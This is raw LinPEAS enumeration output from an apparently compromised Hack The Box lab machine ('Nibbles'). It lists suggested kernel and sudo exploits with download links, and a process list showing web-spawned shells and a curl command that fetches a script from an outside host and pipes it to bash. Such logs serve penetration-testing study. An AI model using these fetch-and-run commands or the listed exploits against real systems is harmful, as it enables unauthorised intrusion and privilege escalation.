         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------------\
    |                             Do you like PEASS?                                  |
    |---------------------------------------------------------------------------------|
    |         Learn Cloud Hacking       :     https://training.hacktricks.xyz         |
    |         Follow on Twitter         :     @hacktricks_live                        |
    |         Respect on HTB            :     SirBroccoli                             |
    |---------------------------------------------------------------------------------|
    |                                 Thank you!                                      |
    \---------------------------------------------------------------------------------/
          LinPEAS-ng by carlospolop

ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.

Linux Privesc Checklist: https://book.hacktricks.wiki/en/linux-hardening/linux-privilege-escalation-checklist.html
 LEGEND:
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

 Starting LinPEAS. Caching Writable Folders...
                               ╔═══════════════════╗
═══════════════════════════════╣ Basic information ╠═══════════════════════════════                                                                                                                                                         
                               ╚═══════════════════╝                                                                                                                                                                                        
OS: Linux version 4.4.0-104-generic (buildd@lgw01-amd64-022) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.5) ) #127-Ubuntu SMP Mon Dec 11 12:16:42 UTC 2017
User & Groups: uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
Hostname: Nibbles

[+] /bin/ping is available for network discovery (LinPEAS can discover hosts, learn more with -h)
[+] /bin/bash is available for network discovery, port scanning and port forwarding (LinPEAS can discover hosts, scan ports, and forward ports. Learn more with -h)                                                                         
[+] /bin/nc is available for network discovery & port scanning (LinPEAS can discover hosts and scan ports, learn more with -h)                                                                                                              
                                                                                                                                                                                                                                            

Caching directories DONE
                                                                                                                                                                                                                                            
                              ╔════════════════════╗
══════════════════════════════╣ System Information ╠══════════════════════════════                                                                                                                                                          
                              ╚════════════════════╝                                                                                                                                                                                        
╔══════════╣ Operative system
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#kernel-exploits                                                                                                                                           
Linux version 4.4.0-104-generic (buildd@lgw01-amd64-022) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.5) ) #127-Ubuntu SMP Mon Dec 11 12:16:42 UTC 2017                                                                         
Distributor ID: Ubuntu
Description:    Ubuntu 16.04.3 LTS
Release:        16.04
Codename:       xenial

╔══════════╣ Sudo version
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-version                                                                                                                                              
Sudo version 1.8.16                                                                                                                                                                                                                         


╔══════════╣ PATH
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-path-abuses                                                                                                                                      
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin                                                                                                                                                                                

╔══════════╣ Date & uptime
Sun Apr 27 01:58:46 EDT 2025                                                                                                                                                                                                                
 01:58:46 up 23:25,  0 users,  load average: 0.52, 0.26, 0.10

╔══════════╣ Unmounted file-system?
╚ Check if you can mount umounted devices                                                                                                                                                                                                   
/dev/mapper/Shocker--vg-root /               ext4    errors=remount-ro 0       1                                                                                                                                                            
UUID=c227aef1-7e4c-4094-8b0b-095581dd0bc6 /boot           ext2    defaults        0       2
/dev/mapper/Shocker--vg-swap_1 none            swap    sw              0       0

╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)
disk                                                                                                                                                                                                                                        
sda
sda1
sda2
sda5

╔═════════� 32  140k   32 46222    0     0  37369      0  0:00:03  0:00:01  0:00:02 37366��╣ Environment
╚ Any private information inside environment variables?                                                                                                                                                                                     
APACHE_PID_FILE=/var/run/apache2/apache2.pid                                                                                                                                                                                                
APACHE_RUN_USER=nibbler
APACHE_LOG_DIR=/var/log/apache2
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
PWD=/
APACHE_RUN_GROUP=nibbler
LANG=C
SHLVL=3
APACHE_LOCK_DIR=/var/lock/apache2
APACHE_RUN_DIR=/var/run/apache2
_=/usr/bin/env

╔══════════╣ Searching Signature verification failed in dmesg
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#dmesg-signature-verification-failed                                                                                                                       
dmesg Not Found                                                                                                                                                                                                                             
                                                                                                                                                                                                                                            
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester                                                                                                                                                                                          
[+] [CVE-2017-16995] eBPF_verifier                                                                                                                                                                                                          

   Details: https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html
   Exposure: highly probable
   Tags: debian=9.0{kernel:4.9.0-3-amd64},fedora=25|26|27,ubuntu=14.04{kernel:4.4.0-89-generic},[ ubuntu=(16.04|17.04) ]{kernel:4.(8|10).0-(19|28|45)-generic}
   Download URL: https://www.exploit-db.com/download/45010
   Comments: CONFIG_BPF_SYSCALL needs to be set && kernel.unprivileged_bpf_disabled != 1

[+] [CVE-2016-5195] dirtycow

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5{kernel:2.6.(18|24|33)-*},RHEL=6{kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31},RHEL=7{kernel:3.10.0-*|4.2.0-0.21.el7},[ ubuntu=16.04|14.04|12.04 ]
   Download URL: https://www.exploit-db.com/download/40611
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2016-5195] dirtycow 2

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5|6|7,ubuntu=14.04|12.04,ubuntu=10.04{kernel:2.6.32-21-generic},[ ubuntu=16.04 ]{kernel:4.4.0-21-generic}
   Download URL: https://www.exploit-db.com/download/40839
   ext-url: https://www.exploit-db.com/download/40847
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2017-7308] af_packet

   Details: https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html
   Exposure: probable
   Tags: [ ubuntu=16.04 ]{kernel:4.8.0-(34|36|39|41|42|44|45)-generic}
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-7308/poc.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2017-7308/poc.c
   Comments: CAP_NET_RAW cap or CONFIG_USER_NS=y needed. Modified version at 'ext-url' adds support for additional kernels

[+] [CVE-2017-6074] dccp

   Details: http://www.openwall.com/lists/oss-security/2017/02/22/3
   Exposure: probable
   Tags: [ ubuntu=(14.04|16.04) ]{kernel:4.4.0-62-generic}
   Download URL: https://www.exploit-db.com/download/41458
   Comments: Requires Kernel be built with CONFIG_IP_DCCP enabled. Includes partial SMEP/SMAP bypass

[+] [CVE-2017-1000112] NETIF_F_UFO

   Details: http://www.openwall.com/lists/oss-security/2017/08/13/1
   Exposure: probable
   Tags: ubuntu=14.04{kernel:4.4.0-*},[ ubuntu=16.04 ]{kernel:4.8.0-*}
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-1000112/poc.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2017-1000112/poc.c
   Comments: CAP_NET_ADMIN cap or CONFIG_USER_NS=y needed. SMEP/KASLR bypass included. Modified version at 'ext-url' adds support for additional distros/kernels

[+] [CVE-2016-8655] chocobo_root

   Details: http://www.openwall.com/lists/oss-security/2016/12/06/1
   Exposure: probable
   Tags: [ ubuntu=(14.04|16.04) ]{kernel:4.4.0-(21|22|24|28|31|34|36|38|42|43|45|47|51)-generic}
   Download URL: https://www.exploit-db.com/download/40871
   Comments: CAP_NET_RAW capability is needed OR CONFIG_USER_NS=y needs to be enabled

[+] [CVE-2016-4557] double-fdput()

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=808
   Exposure: probable
   Tags: [ ubuntu=16.04 ]{kernel:4.4.0-21-generic}
   Download URL: https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip
   Comments: CONFIG_BPF_SYSCALL needs to be set && kernel.unprivileged_bpf_disabled != 1

[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)

   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: less probable
   Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2022-2586] nft_object UAF

   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: less probable
   Tags: ubuntu=(20.04){kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: mint=19,ubuntu=18|20, debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2019-18634] sudo pwfeedback

   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/
   Exposure: less probable
   Tags: mint=19
   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c
   Comments: sudo configuration requires pwfeedback to be enabled.

[+] [CVE-2019-15666] XFRM_UAF

   Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc
   Exposure: less probable
   Download URL: 
   Comments: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled

[+] [CVE-2018-1000001] RationalLove

   Details: https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/
   Exposure: less probable
   Tags: debian=9{libc6:2.24-11+deb9u1},ubuntu=16.04.3{libc6:2.23-0ubuntu9}
   Download URL: https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/RationalLove.c
   Comments: kernel.unprivileged_userns_clone=1 required

[+] [CVE-2017-5618] setuid screen v4.5.0 LPE

   Details: https://seclists.org/oss-sec/2017/q1/184
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154

[+] [CVE-2017-1000366,CVE-2017-1000379] linux_ldso_hwcap_64

   Details: https://www.qualys.com/2017/06/19/stack-clash/stack-clash.txt
   Exposure: less probable
   Tags: debian=7.7|8.5|9.0,ubuntu=14.04.2|16.04.2|17.04,fedora=22|25,centos=7.3.1611
   Download URL: https://www.qualys.com/2017/06/19/stack-clash/linux_ldso_hwcap_64.c
   Comments: Uses "Stack Clash" technique, works against most SUID-root binaries

[+] [CVE-2017-1000253] PIE_stack_corruption

   Details: https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.txt
   Exposure: less probable
   Tags: RHEL=6,RHEL=7{kernel:3.10.0-514.21.2|3.10.0-514.26.1}
   Download URL: https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.c

[+] [CVE-2016-9793] SO_{SND|RCV}BUFFORCE

   Details: https://github.com/xairy/kernel-exploits/tree/master/CVE-2016-9793
   Exposure: less probable
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-9793/poc.c
   Comments: CAP_NET_ADMIN caps OR CONFIG_USER_NS=y needed. No SMEP/SMAP/KASLR bypass included. Tested in QEMU only

[+] [CVE-2016-2384] usb-midi

   Details: https://xairy.github.io/blog/2016/cve-2016-2384
   Exposure: less probable
   Tags: ubuntu=14.04,fedora=22
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-2384/poc.c
   Comments: Requires ability to plug in a malicious USB device and to execute a malicious binary as a non-privileged user

[+] [CVE-2016-0728] keyring

   Details: http://perception-point.io/2016/01/14/analysis-and-exploitation-of-a-linux-kernel-vulnerability-cve-2016-0728/
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/40003
   Comments: Exploit takes about ~30 minutes to run. Exploit is not reliable, see: https://cyseclabs.com/blog/cve-2016-0728-poc-not-working


╔══════════╣ Protections
═╣ AppArmor enabled? .............. You do not have enough privilege to read the profile set.                                                                                                                                               
apparmor module is loaded.
═╣ AppArmor profile? .............. unconfined
═╣ is linuxONE? ................... s390x Not Found
═╣ grsecurity present? ............ grsecurity Not Found                                                                                                                                                                                    
═╣ PaX bins present? .............. PaX Not Found                                                                                                                                                                                           
═╣ Execshield enabled? ............ Execshield Not Found                                                                                                                                                                                    
═╣ SELinux enabled? ............... sestatus Not Found                                                                                                                                                                                      
═╣ Seccomp enabled? ............... disabled                                                                                                                                                                                                
═╣ User namespace? ................ enabled
═╣ Cgroup2 enabled? ............... disabled
═╣ Is ASLR enabled? ............... Yes
═╣ Printer? ....................... No
═╣ Is this a virtual machine? ..... Yes (vmware)                                                                                                                                                                                            

                                   ╔═══════════╗
═══════════════════════════════════╣ Container ╠═══════════════════════════════════                                                                                                                                                         
                                   ╚═══════════╝                                                                                                                                                                                            
╔══════════╣ Container related tools present (if any):
/usr/bin/lxc                                                                                                                                                                                                                                
╔══════════╣ Container details
═╣ Is this a container? ........... No                                                                                                                                                                                                      
═╣ Any running containers? ........ No                                                                                                                                                                                                      
                                                                                                                                                                                                                                            

                                     ╔═══════╗
═════════════════════════════════════╣ Cloud ╠═════════════════════════════════════                                                                                                                                                         
                                     ╚═══════╝                                                                                                                                                                                              
Learn and practice cloud hacking techniques in training.hacktricks.xyz
                                                                                                                                                                                                                                            
═╣ GCP Virtual Machine? ................. No
═╣ GCP Cloud Funtion? ................... No
═╣ AWS ECS? ............................. No
═╣ AWS EC2? ............................. No
═╣ AWS EC2 Beanstalk? ................... No
═╣ AWS Lambda? .......................... No
═╣ AWS Codebuild? ....................... No
═╣ DO Droplet? .......................... No
═╣ IBM Cloud VM? ........................ No
═╣ Azure VM or Az metadata? ............. No
═╣ Azure APP or IDENTITY_ENDPOINT? ...... No
═╣ Azure Automation Account? ............ No
═╣ Aliyun ECS? .......................... No
═╣ Tencent CVM? ......................... No



                ╔════════════════════════════════════════════════╗
════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════                                                                                                                                                          
                ╚════════════════════════════════════════════════╝                                                                                                                                                                          
╔══════════╣ Running processes (cleaned)
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#processes                                                                                                  
root          1  0.0  0.5 185092  5776 ?        Ss   Apr26   0:02 /sbin/init                                                                                                                                                                
root        476  0.0  0.2  28336  2704 ?        Ss   Apr26   0:00 /lib/systemd/systemd-journald
root        528  0.0  0.1 102972  1632 ?        Ss   Apr26   0:00 /sbin/lvmetad -f
root        544  0.0  0.4  45484  4532 ?        Ss   Apr26   0:00 /lib/systemd/systemd-udevd
systemd+    829  0.0  0.2 100324  2324 ?        Ssl  Apr26   0:02 /lib/systemd/systemd-timesyncd
  └─(Caps) 0x0000000002000000=cap_sys_time
root        947  0.0  0.9 192284  9952 ?        Ssl  Apr26   0:46 /usr/bin/vmtoolsd
daemon[0m      948  0.0  0.2  26048  2020 ?        Ss   Apr26   0:00 /usr/sbin/atd -f
root        949  0.0  0.1   4400  1364 ?        Ss   Apr26   0:00 /usr/sbin/acpid
root        956  0.0  0.2  29012  2600 ?        Ss   Apr26   0:00 /usr/sbin/cron -f
root        957  0.0  0.5 275864  5812 ?        Ssl  Apr26   0:01 /usr/lib/accountsservice/accounts-daemon[0m
root        958  0.0  0.5 628992  5092 ?        Ssl  Apr26   0:04 /usr/bin/lxcfs /var/lib/lxcfs/
root        970  0.0  2.3 345940 23724 ?        Ssl  Apr26   0:01 /usr/lib/snapd/snapd
message+    978  0.0  0.3  42940  3912 ?        Ss   Apr26   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
  └─(Caps) 0x0000000020000000=cap_audit_write
root       1007  0.0  0.1  20104  1200 ?        Ss   Apr26   0:00 /lib/systemd/systemd-logind
syslog     1008  0.0  0.3 256396  3288 ?        Ssl  Apr26   0:00 /usr/sbin/rsyslogd -n
root       1030  0.0  0.5 277092  5772 ?        Ssl  Apr26   0:00 /usr/lib/policykit-1/polkitd --no-debug
root       1037  0.0  0.0  13376   168 ?        Ss   Apr26   0:00 /sbin/mdadm --monitor --pid-file /run/mdadm/monitor.pid --daemon[0mise --scan --syslog
root       1113  0.0  0.2  16120  2696 ?        Ss   Apr26   0:00 /sbin/dhclient -1 -v -pf /run/dhclient.ens192.pid -lf /var/lib/dhcp/dhclient.ens192.leases -I -df /var/lib/dhcp/dhclient6.ens192.leases ens192
root       1205  0.0  0.5  65524  5484 ?        Ss   Apr26   0:00 /usr/sbin/sshd -D
root       1229  0.0  0.0   5224   120 ?        Ss   Apr26   0:01 /sbin/iscsid
root       1230  0.0  0.3   5724  3524 ?        S<Ls Apr26   0:08 /sbin/iscsid
mysql      1236  0.0 15.3 1116176 153156 ?      Ssl  Apr26   0:22 /usr/sbin/mysqld
root       1303  0.0  0.1  15940  1608 tty1     Ss+  Apr26   0:00 /sbin/agetty --noclear tty1 linux
root       1347  0.0  2.3 326204 23940 ?        Ss   Apr26   0:02 /usr/sbin/apache2 -k start
nibbler    2402  0.0  2.0 330652 20084 ?        S    Apr26   0:00  _ /usr/sbin/apache2 -k start
nibbler   18407  0.0  0.0   4508   704 ?        S    Apr26   0:00  |   _ sh -c perl -e 'exec "/bin/sh";'
nibbler   18408  0.0  0.0   4508   708 ?        S    Apr26   0:00  |       _ /bin/sh
nibbler    2405  0.0  1.9 330640 19316 ?        S    Apr26   0:00  _ /usr/sbin/apache2 -k start
nibbler   18700  0.0  0.0   4508   708 ?        S    Apr26   0:00  |   _ sh -c /bin/sh
nibbler   18701  0.0  0.0   4508   704 ?        S    Apr26   0:00  |       _ /bin/sh
nibbler    2406  0.0  2.0 330796 20036 ?        S    Apr26   0:00  _ /usr/sbin/apache2 -k start
nibbler   18426  0.0  0.0   4508   784 ?        S    Apr26   0:00  |   _ sh -c /bin/sh -i
nibbler   18427  0.0  0.0   4508   716 ?        S    Apr26   0:00  |       _ /bin/sh -i
nibbler    2407  0.0  2.1 331168 21580 ?        S    Apr26   0:00  _ /usr/sbin/apache2 -k start
nibbler    2408  0.0  1.9 330784 19676 ?        S    Apr26   0:00  _ /usr/sbin/apache2 -k start
nibbler   18714  0.0  0.0   4508   792 ?        S    Apr26   0:00  |   _ sh -c /bin/bash
nibbler   18715  0.0  0.2  18024  2844 ?        S    Apr26   0:00  |       _ /bin/bash
nibbler   17367  0.0  2.1 331144 21344 ?        S    Apr26   0:00  _ /usr/sbin/apache2 -k start
nibbler   18401  0.0  0.0   4508   760 ?        S    Apr26   0:00  |   _ sh -c perl -e 'exec "/bin/sh";'
nibbler   18402  0.0  0.0   4508   700 ?        S    Apr26   0:00  |       _ /bin/sh
nibbler   17378  0.0  2.0 330932 19984 ?        S    Apr26   0:00  _ /usr/sbin/apache2 -k start
nibbler   18655  0.0  0.0   4508   712 ?        S    Apr26   0:00  |   _ sh -c python3 -c 'import pty; pty.spawn("/bin/bash")'
nibbler   18656  0.0  0.8  35840  8524 ?        S    Apr26   0:00  |       _ python3 -c import pty; pty.spawn("/bin/bash")
nibbler   18657  0.0  0.3  18216  3128 pts/0    Ss+  Apr26   0:00  |           _ /bin/bash
nibbler   17380  0.0  2.0 331152 20960 ?        S    Apr26   0:00  _ /usr/sbin/apache2 -k start
nibbler   17381  0.0  1.9 330636 19396 ?        S    Apr26   0:00  _ /usr/sbin/apache2 -k start
nibbler   18420  0.0  0.0   4508   804 ?        S    Apr26   0:00  |   _ sh -c perl -e 'exec "/bin/sh";'
nibbler   18421  0.0  0.0   4508   756 ?        S    Apr26   0:00  |       _ /bin/sh
nibbler   18370  0.0  1.3 326252 13472 ?        S    Apr26   0:00  _ /usr/sbin/apache2 -k start
nibbler   18680  0.0  0.0   4508   752 ?        S    Apr26   0:00  |   _ sh -c python3 -c 'import pty; pty.spawn("/bin/sh")'
nibbler   18681  0.0  0.8  35832  8456 ?        S    Apr26   0:00  |       _ python3 -c import pty; pty.spawn("/bin/sh")
nibbler   18682  0.0  0.0   4508   788 pts/1    Ss+  Apr26   0:00  |           _ /bin/sh
nibbler   18660  0.0  1.9 330656 19640 ?        S    Apr26   0:00  _ /usr/sbin/apache2 -k start
nibbler   18683  0.0  1.9 330632 19640 ?        S    Apr26   0:00  _ /usr/sbin/apache2 -k start
nibbler   20860  0.0  0.0   4508   788 ?        S    01:34   0:00  |   _ sh -c uname -a; w; id; /bin/bash -i
nibbler   20864  0.0  0.3  18216  3176 ?        S    01:34   0:00  |       _ /bin/bash -i
nibbler   20867  0.0  0.8  35836  8460 ?        S    01:34   0:00  |           _ python3 -c import pty; pty.spawn("/bin/bash")
nibbler   20868  0.0  0.3  18224  3276 pts/2    Ss   01:34   0:00  |               _ /bin/bash
nibbler   43044  0.0  0.6  91860  6104 pts/2    S+   01:58   0:00  |                   _ curl http://10.10.14.109/linpeas.sh
nibbler   43045  0.7  0.5  20564  5292 pts/2    S+   01:58   0:00  |                   _ /bin/bash
nibbler   47602  0.0  0.4  20564  4092 pts/2    S+   01:58   0:00  |                       _ /bin/bash
nibbler   47606  0.0  0.3  34728  3148 pts/2    R+   01:58   0:00  |                       |   _ ps fauxwww
nibbler   47605  0.0  0.2  20564  2692 pts/2    S+   01:58   0:00  |                       _ /bin/bash
nibbler   18712  0.0  1.5 326640 15224 ?        S    Apr26   0:00  _ /usr/sbin/apache2 -k start
nibbler   18778  0.0  1.3 326276 13712 ?        S    Apr26   0:00  _ /usr/sbin/apache2 -k start
nibbler   18821  0.0  0.8 326244  8968 ?        S    Apr26   0:00  _ /usr/sbin/apache2 -k start
nibbler   17518  0.0  0.0   4508   760 ?        S    Apr26   0:00 /bin/sh
nibbler   17520  0.0  0.3   3612  3204 ?        Sl   Apr26   0:03  _ ./shell


╔══════════╣ Processes with credentials in memory (root req)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#credentials-from-process-memory                                                                                                                           
gdm-password Not Found                                                                                                                                                                                                                      
gnome-keyring-daemon Not Found                                                                                                                                                                                                              
lightdm Not Found                                                                                                                                                                                                                           
vsftpd Not Found                                                                                                                                                                                                                            
apache2 process found (dump creds from memory as root)                                                                                                                                                                                      
sshd Not Found
                                                                                                                                                                                                                                            
╔══════════╣ Processes whose PPID belongs to a different user (not root)
╚ You will know if a user can somehow spawn processes as a different user                                                                                                                                                                   
                                                                                                                                                                                                                                            
╔══════════╣ Files opened by processes belonging to other users
╚ This is usually empty because of the lack of privileges to read other user processes information                                                                                                                                          
COMMAND     PID   TID             USER   FD      TYPE DEVICE SIZE/OFF   NODE NAME                                                                                                                                                           

╔══════════╣ Systemd PATH
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#systemd-path---relative-paths                                                                                                                             
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin                                                                                                                                                                           

╔══════════╣ Cron jobs
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scheduledcron-jobs                                                                                                                                        
/usr/bin/crontab                                                                                                                                                                                                                            
incrontab Not Found
-rw-r--r-- 1 root root     722 Apr  5  2016 /etc/crontab                                                                                                                                                                                    

/etc/cron.d:
total 24
drwxr-xr-x  2 root root 4096 Dec 28  2017 .
drwxr-xr-x 92 root root 4096 Nov 30  2021 ..
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder
-rw-r--r--  1 root root  589 Jul 16  2014 mdadm
-rw-r--r--  1 root root  712 Sep  5  2017 php
-rw-r--r--  1 root root  191 Sep 22  2017 popularity-contest

/etc/cron.daily:
total 60
drwxr-xr-x  2 root root 4096 Dec 28  2017 .
drwxr-xr-x 92 root root 4096 Nov 30  2021 ..
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder
-rwxr-xr-x  1 root root  539 Apr  5  2016 apache2
-rwxr-xr-x  1 root root  376 Mar 31  2016 apport
-rwxr-xr-x  1 root root 1474 Jun 19  2017 apt-compat
-rwxr-xr-x  1 root root  355 May 22  2012 bsdmainutils
-rwxr-xr-x  1 root root 1597 Nov 26  2015 dpkg
-rwxr-xr-x  1 root root  372 May  6  2015 logrotate
-rwxr-xr-x  1 root root 1293 Nov  6  2015 man-db
-rwxr-xr-x  1 root root  539 Jul 16  2014 mdadm
-rwxr-xr-x  1 root root  435 Nov 18  2014 mlocate
-rwxr-xr-x  1 root root  249 Nov 12  2015 passwd
-rwxr-xr-x  1 root root 3449 Feb 26  2016 popularity-contest
-rwxr-xr-x  1 root root  214 May 24  2016 update-notifier-common

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 Sep 22  2017 .
drwxr-xr-x 92 root root 4096 Nov 30  2021 ..
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 Sep 22  2017 .
drwxr-xr-x 92 root root 4096 Nov 30  2021 ..
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder

/etc/cron.weekly:
total 24
drwxr-xr-x  2 root root 4096 Sep 22  2017 .
drwxr-xr-x 92 root root 4096 Nov 30  2021 ..
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder
-rwxr-xr-x  1 root root   86 Apr 13  2016 fstrim
-rwxr-xr-x  1 root root  771 Nov  6  2015 man-db
-rwxr-xr-x  1 root root  211 May 24  2016 update-notifier-common

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )

╔══════════╣ System timers
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#timers                                                                                                                                                    
NEXT                         LEFT          LAST                         PASSED    UNIT                         ACTIVATES                                                                                                                    
Sun 2025-04-27 02:09:00 EDT  9min left     Sun 2025-04-27 01:39:05 EDT  20min ago phpsessionclean.timer        phpsessionclean.service
Sun 2025-04-27 02:48:40 EDT  48min left    Sat 2025-04-26 02:48:40 EDT  23h ago   systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
Sun 2025-04-27 03:17:33 EDT  1h 17min left Sat 2025-04-26 06:46:51 EDT  19h ago   apt-daily.timer              apt-daily.service
